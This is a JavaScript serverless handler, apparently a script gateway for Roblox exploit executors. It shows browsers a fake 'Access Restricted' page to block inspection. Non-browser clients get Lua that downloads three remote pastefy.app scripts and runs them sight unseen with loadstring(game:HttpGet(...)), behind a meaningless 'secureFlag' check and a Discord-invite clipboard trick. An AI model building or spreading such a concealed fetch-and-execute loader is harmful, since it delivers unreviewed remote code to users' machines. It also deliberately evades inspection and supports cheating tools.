export default function handler(req, res) {
  const accept = (req.headers.accept || "").toLowerCase();

  // ===============================
  // BLOCK BROWSERS (HTML ONLY)
  // ===============================
  if (accept.includes("text/html")) {
    res.statusCode = 403;
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.end(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Access Restricted</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />

<style>
html, body {
  margin: 0;
  width: 100%;
  height: 100%;
  font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont;
  color: #ffffff;

  background:
    radial-gradient(60% 80% at 15% 30%, rgba(255,255,255,0.08), transparent 60%),
    radial-gradient(50% 70% at 85% 70%, rgba(255,255,255,0.06), transparent 65%),
    radial-gradient(40% 60% at 50% 50%, rgba(255,255,255,0.04), transparent 70%),
    linear-gradient(120deg, #000000, #0a0a0a, #000000);

  background-size: 300% 300%;
  animation: inkFlow 22s ease-in-out infinite;

  display: flex;
  align-items: center;
  justify-content: center;
}

@keyframes inkFlow {
  0%   { background-position: 0% 50%; }
  50%  { background-position: 100% 50%; }
  100% { background-position: 0% 50%; }
}

.container {
  width: 600px;
  padding: 44px 48px;
  border-radius: 20px;

  background: rgba(0, 0, 0, 0.78);
  backdrop-filter: blur(18px);

  border: 1px solid rgba(255,255,255,0.08);
  box-shadow:
    0 0 90px rgba(255,255,255,0.05),
    inset 0 0 24px rgba(255,255,255,0.025);
}

.icon {
  width: 44px;
  height: 44px;
  margin-bottom: 18px;
  opacity: 0.95;
}

h1 {
  font-size: 22px;
  font-weight: 600;
  margin-bottom: 14px;
  letter-spacing: 0.4px;
}

p {
  font-size: 14.6px;
  line-height: 1.65;
  opacity: 0.86;
}

.footer {
  margin-top: 26px;
  font-size: 12px;
  opacity: 0.45;
}
</style>
</head>
<body>
<div class="container">
<svg class="icon" xmlns="http://www.w3.org/2000/svg" fill="none"
viewBox="0 0 24 24" stroke="currentColor">
<path stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"
d="M12 3l7 4v5c0 5-3.5 9-7 9s-7-4-7-9V7l7-4z"/>
</svg>

<h1>Access Restricted</h1>
<p>This endpoint serves protected Lua content intended exclusively for authorized execution environments.</p>
<p>Direct browser access or inspection is not permitted.</p>
<p>Please contact the script owner if you believe this is an error.</p>

<div class="footer">© Secure Script Gateway</div>
</div>
</body>
</html>`);
    return; // 🔴 VERY IMPORTANT
  }

  // ===============================
  // ROBLOX EXECUTORS (RAW LUA)
  // ===============================
  res.statusCode = 200;
  res.setHeader("Content-Type", "text/plain; charset=utf-8");

  res.end(`-- All Belong 2 @mizu-dump

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local Dc = "https://discord.gg/mxSvSpJe7s"

local function secureFlag()
  local a, b, c = 1234, 4321, 5555
  return ((a + b) - c) == 0
end

if not secureFlag() then
  if setclipboard then
    setclipboard(Dc)
  end
  LocalPlayer:Kick("Unauthorized access detected.\\nDiscord: "..Dc)
  return
end

loadstring(game:HttpGet("https://pastefy.app/swVoPwKZ/raw"))()
loadstring(game:HttpGet("https://pastefy.app/cLGvFayb/raw"))()
loadstring(game:HttpGet("https://pastefy.app/ZfpoaVWN/raw"))()
`);
}
